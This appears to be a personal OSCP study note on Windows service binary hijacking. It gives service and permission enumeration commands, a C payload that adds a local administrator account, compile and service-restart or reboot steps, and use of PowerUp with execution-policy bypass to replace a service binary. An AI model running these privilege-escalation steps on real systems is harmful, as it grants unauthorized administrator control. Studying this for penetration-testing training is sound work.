---
aliases:
  - Service Binary Hijacking
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - windows
  - privesc
  - privilege_escalation
  - service
  - windows_services
  - service_binary
  - service_binary_hijack
author: Mehdi N Tehrani
creat_date: 2024-01-02
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Windows Services
## Tools
#sc #get_service #get_ciminstance
- *services snap-in*
- *powershell*
	- `sc.exe`
	- `Get-Service`
	- `Get-CimInstance`
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running' -and $_PathName -notmatch 'C:\\Windows'}
```


## Accounts
#local_system #network_service #local_service
to run Windows services
- *LocalSystem* (includes the SIDs of `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators` in its token)
- *Network Service*
- *Local Service* 

## Permissions
### tools
#icacls #get_acl
- `icacls`
- `Get-ACL`

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

## Exploit
#stdlib_h #stdlib
1. Write exploit
**adduser.c**
> [!info] password should not be longer than 14 chars
```c
#include <stdlib.h>

int main(){
  int i;

  i = system("net user <username> <password> /add");
  i = system("net localgroup administrators <username> /add");
  
  return 0;
}
```
2. Compile
#mingw32 #x86_64-mingw32-gcc #x86_64-mingw32
```sh
x86_64-mingw32-gcc adduser.c -o adduser.exe
```

3. Restart service
```cmd
net stop <service>
net start <service>
```

```powershell
Restart-Service <service>
```

4. Check shutdown privileges:
if user cannot restart the service, and service is set to  'Automatic' we can restart the machine.
#whoami #priv #shutdown #seshutdownprivilege
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```
In this list, it's important what privileges are listed. **State** is not important from the users perspective. State, means if the privilege is enabled/disabled for the current process; in this case `whoami`

5. Restart the machine
```
shutdown /r /t 0
```

6. Check if new user is added to the administrators group
```
Get-LocalGroupMember administrators
```

### tools
#### PowerUp
#powerup #powerup_ps1
Transfer PowerUp to target machine
```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python -m http.server 80
```

```powershell
powershell.exe -ep bypass 
. ./PowerUp.ps1
Get-ModifiableServiceFile
```
PowerUp output:
```
ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
```

We can choose to use `Install-ServiceBinary -Name 'mysql'` which replaces mysql binary with a code that adds a user named `john` with password `Password123!` added to the administrators localgroup.

